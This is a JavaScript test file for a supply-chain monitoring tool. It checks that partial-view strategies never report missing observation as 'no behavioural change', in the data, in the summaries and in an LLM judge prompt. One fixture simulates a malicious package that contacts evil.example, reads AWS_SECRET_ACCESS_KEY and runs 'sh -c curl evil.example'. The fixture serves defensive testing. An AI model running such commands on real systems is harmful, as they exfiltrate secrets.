/**
 * "We could not establish X" is never reported as "X is absent".
 *
 *   node absence.test.js
 *
 * This project's entire argument is a negative claim: *we watched two thousand package-upgrades and
 * almost nothing changed*. A negative claim is only worth anything if the watching was real, which
 * means the one mistake it cannot afford is presenting an absence of observation as an observation
 * of absence.
 *
 * ── Why this needs its own file ─────────────────────────────────────────────
 *
 * The mistake is not one bug. It is a shape, and it reappears at every layer independently, because
 * at every layer the two facts have the same representation — an empty list, a false, a missing
 * field — and only the surrounding sentence tells them apart. Four instances were found in one
 * afternoon across this project and its sibling, and not one of them was caught by reading the code:
 *
 *   schema        `isQuiet` counted six empty arrays as "the package did nothing", when
 *                 `transcript()` had deleted the channels the strategy could not see. A package
 *                 exfiltrating a credential under `fsdiff` came back QUIET.
 *   presentation  "no behavioural change" — the sentence next to two thirds of the corpus — was a
 *                 claim about the package, printed after a run that could not see every channel.
 *   sibling       a repair tool read 0.1-confidence "I cannot see a code" as "the fault cleared".
 *   sibling       "no verified causes on file" and "you ruled them all out" shared a sentence, and
 *                 sent both to a paid technician.
 *
 * So the rule stops being a rule and becomes this file, which asserts the property at every surface
 * that can state it: the data, the one-line summary, the wall's verdict and the model's prompt.
 *
 * A fifth instance should fail a build rather than wait to be noticed.
 */

const assert = require('node:assert');
const { transcript, quietness, observedNothing, CAN_SEE } = require('./transcript/schema');
const { diff, summarise } = require('./differ/diff');
const { buildPrompt } = require('./judge/prompt');

let passed = 0;
const it = (name, fn) => {
  try {
    fn();
    passed++;
    console.log('  ok  ', name);
  } catch (e) {
    console.error('  FAIL', name, '\n       ', e.message);
    process.exitCode = 1;
  }
};

/** A package doing something in every channel a blind strategy would miss. */
const NOISY = {
  net: [{ host: 'evil.example', port: 443, proto: 'tls' }],
  dns: ['evil.example'],
  env: ['AWS_SECRET_ACCESS_KEY'],
  proc: [{ argv: ['sh', '-c', 'curl evil.example'] }],
  fs: [{ op: 'write', path: '/app/x' }],
  exec: [{ how: 'Function', sample: 'fetch(...)' }],
};

const run = (strategy, version, raw = {}) => transcript({ pkg: 'p', version, strategy, raw });
const pairOf = (strategy, raw = {}) => diff(run(strategy, '1.0.0', raw), run(strategy, '1.0.1', raw));

const BLIND = Object.keys(CAN_SEE).filter((s) => Object.values(CAN_SEE[s]).some((v) => !v));
const SIGHTED = Object.keys(CAN_SEE).filter((s) => Object.values(CAN_SEE[s]).every(Boolean));

console.log('absence of evidence is not evidence of absence');

it('the fixtures still exercise the distinction', () => {
  assert.ok(BLIND.length >= 2, 'no strategy has a blind spot — this whole file tests nothing');
  assert.ok(SIGHTED.length >= 1, 'no strategy sees everything — the strong claim can never be made');
});

/* ── 1. the data ───────────────────────────────────────────────────────────── */

it('a blind strategy never produces a trustworthy silence, whatever it saw', () => {
  for (const strategy of BLIND) {
    for (const raw of [{}, NOISY]) {
      const q = quietness(run(strategy, '1.0.0', raw));
      assert.equal(q.trustworthy, false,
        `${strategy} offered its silence as evidence, and it cannot see ${q.blindTo.join(', ')}`);
    }
  }
});

it('a sighted strategy seeing nothing is trustworthy — the claim is still available', () => {
  // The property must not be satisfied by refusing to ever conclude anything.
  for (const strategy of SIGHTED) {
    assert.equal(quietness(run(strategy, '1.0.0')).trustworthy, true,
      `${strategy} sees every channel and its silence was still discounted`);
  }
});

it('a package hidden entirely by the strategy still reports an empty observation', () => {
  // `observedNothing` must keep meaning what it says. It is the honest half of the pair, and a
  // "fix" that made it lie in the other direction would be no better.
  const blind = run('fsdiff', '1.0.0', { ...NOISY, fs: [] });
  assert.equal(observedNothing(blind), true, 'observedNothing has started asserting more than it measures');
  assert.equal(quietness(blind).trustworthy, false);
});

/* ── 2. the diff ───────────────────────────────────────────────────────────── */

it('every diff carries what its silence cannot speak for', () => {
  for (const strategy of Object.keys(CAN_SEE)) {
    const d = pairOf(strategy);
    assert.ok(Array.isArray(d.blindTo), `${strategy}: a diff without a blind list`);
    assert.equal(typeof d.quietTrustworthy, 'boolean', `${strategy}: no trustworthiness on the diff`);
    const expected = Object.entries(CAN_SEE[strategy]).filter(([, v]) => !v).map(([k]) => k).sort();
    assert.deepEqual([...d.blindTo].sort(), expected, `${strategy} misreports its blind spots on the diff`);
  }
});

it('quietTrustworthy is never true while anything was invisible', () => {
  for (const strategy of Object.keys(CAN_SEE)) {
    const d = pairOf(strategy);
    if (d.quietTrustworthy) {
      assert.deepEqual(d.blindTo, [], `${strategy} claims a trustworthy quiet while blind to ${d.blindTo}`);
    }
  }
});

/* ── 3. the sentence ───────────────────────────────────────────────────────── */

it('the wall never states "no behavioural change" after a partial view', () => {
  // The sentence printed next to two thirds of the corpus. It is a claim about the package.
  for (const strategy of BLIND) {
    const line = summarise(pairOf(strategy));
    assert.doesNotMatch(line, /no behavioural change/,
      `${strategy} cannot see ${pairOf(strategy).blindTo.join(', ')} and said: ${line}`);
    assert.match(line, new RegExp(`no change in what ${strategy} can see`),
      `${strategy} did not say what its silence covers: ${line}`);
  }
});

it('and does state it when the run earns it', () => {
  for (const strategy of SIGHTED) {
    assert.match(summarise(pairOf(strategy)), /no behavioural change$/,
      `${strategy} sees everything and still hedged — the qualification has become a reflex`);
  }
});

it('a finding is reported the same way whoever was watching', () => {
  // Only the NEGATIVE claim is weakened by a blind spot. What a strategy did see, it saw.
  const d = pairOf('ebpf', { ...NOISY, exec: [] });
  assert.equal(d.changed, false, 'the fixture is not a no-change pair');
  const withChange = diff(run('ebpf', '1.0.0'), run('ebpf', '1.0.1', { ...NOISY, exec: [] }));
  assert.equal(withChange.severity, 'alarming');
  assert.doesNotMatch(summarise(withChange), /can see/,
    'a positive finding was hedged — a credential read is a credential read');
});

/* ── 4. the model ──────────────────────────────────────────────────────────── */

it('the model is told what was not watched, before it is asked to judge', () => {
  // The model cannot see the CAN_SEE table. If the prompt does not say it, the model will read an
  // empty channel as "this package does not do that" — which is the same bug with a bigger blast
  // radius, because the answer comes back in confident prose.
  for (const strategy of BLIND) {
    const d = pairOf(strategy);
    const { user } = buildPrompt(d, null);
    assert.match(user, /CANNOT observe/, `${strategy}: the prompt does not declare a blind spot`);
    for (const channel of d.blindTo) {
      assert.ok(user.includes(channel), `${strategy}: the prompt omits "${channel}" from what it cannot see`);
    }
    assert.match(user, /silence there means nothing/, `${strategy}: the caveat states the fact and not the consequence`);
  }
});

it('a sighted strategy is not made to apologise to the model either', () => {
  for (const strategy of SIGHTED) {
    assert.doesNotMatch(buildPrompt(pairOf(strategy), null).user, /CANNOT observe/,
      `${strategy} sees every channel and the prompt told the model otherwise`);
  }
});

console.log(`\n${passed} passed  ·  ${Object.keys(CAN_SEE).length} strategies, ${BLIND.length} of them partial`);
